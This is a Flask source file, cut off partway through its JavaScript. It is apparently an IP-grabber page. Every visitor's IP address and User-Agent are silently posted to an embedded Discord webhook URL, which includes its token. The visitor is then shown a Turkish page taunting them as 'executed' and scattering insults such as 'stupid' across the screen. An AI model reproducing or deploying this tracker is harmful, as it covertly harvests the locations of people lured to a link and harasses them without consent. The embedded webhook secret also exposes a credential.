from flask import Flask, request
import requests
import os

app = Flask(__name__)

# Discord Webhook URL'ni buraya yapıştır
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565829327067684985/o10w6-xbGWqXFeAe20JDhxyoUBr74JcdsswTmLNxKKj22G5vJIF2Y9LRs-LDiujHz2PQ"

@app.route('/')
def ip_logger():
    if request.headers.get('X-Forwarded-For'):
        ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip_address = request.remote_addr

    user_agent = request.headers.get('User-Agent')

    # Discord'a gönderilecek mesaj
    discord_data = {
        "content": f"🚨 **Yeni Ziyaretçi Yakalandı (Render)!**\n> 🌐 **IP:** `{ip_address}`\n> 💻 **Cihaz:** `{user_agent}`"
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
    except Exception as e:
        print(e)

    # Arka planın yazılarla dolup taşmasını sağlayan güncel tasarım
    html_content = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sintuv</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background-color: #06090f;
                color: #f1f5f9;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                position: relative;
            }
            /* Dinamik olarak üretilen spam yazılar */
            .spam-text {
                position: absolute;
                font-size: 1.2rem;
                color: rgba(239, 68, 68, 0.22);
                font-weight: bold;
                pointer-events: none;
                user-select: none;
                white-space: nowrap;
            }
            .container {
                text-align: center;
                background: #111827;
                padding: 50px 40px;
                border-radius: 20px;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8);
                max-width: 600px;
                width: 90%;
                border: 1px solid rgba(239, 68, 68, 0.3);
                z-index: 10;
            }
            h1 {
                font-size: 2.2rem;
                margin-bottom: 25px;
                color: #ef4444;
                letter-spacing: 1px;
                text-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
            }
            .textbox {
                background: #1f2937;
                border: 1px solid #374151;
                color: #e2e8f0;
                padding: 25px;
                border-radius: 12px;
                font-size: 1.3rem;
                margin-bottom: 30px;
                box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
            }
            .footer {
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 10px;
                font-size: 1.1rem;
                color: #94a3b8;
                font-weight: 600;
            }
            .footer svg {
                width: 22px;
                height: 22px;
                fill: url(#instagram-gradient);
            }
            .footer span {
                color: #38bdf8;
                letter-spacing: 1px;
            }
        </style>
    </head>
    <body>
        <!-- JavaScript ile ekranı dolduracak alan -->
        <div id="background-spams"></div>

        <div class="container">
            <h1>Sintuv tarafından infazınız verilmiştir</h1>
            <div class="textbox">
                Geçmiş olsun.
            </div>
            <div class="footer">
                <!-- SVG Instagram Logosu -->
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%">
                        <stop offset="0%" stop-color="#fdf497"/>
                        <stop offset="5%" stop-color="#fdf497"/>
                        <stop offset="45%" stop-color="#fd5949"/>
                        <stop offset="60%" stop-color="#d6249f"/>
                        <stop offset="90%" stop-color="#285AEB"/>
                    </radialGradient>
                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
                </svg>
                <span>Sintuv0</span>
            </div>
        </div>

        <script>
            // Ekranı rastgele ve bolca spam yazıyla dolduran script
            const texts = ["Beynin yok sanirsam.", "Aq salagi"];
            const container = document.getElementById('background-spams');
            
            for (let i = 0; i < 25; i++) {
                const div = document.createElement('div');
                div.className = 'spam-text';
                div.innerText = texts[Math.floor(Math.random() * texts.length)];
                
                // Rastgele konum ve açı ver
                div.style.top = Math.random() * 90 + 'vh';
                div.style.left = Math.random() * 90 + 'vw';
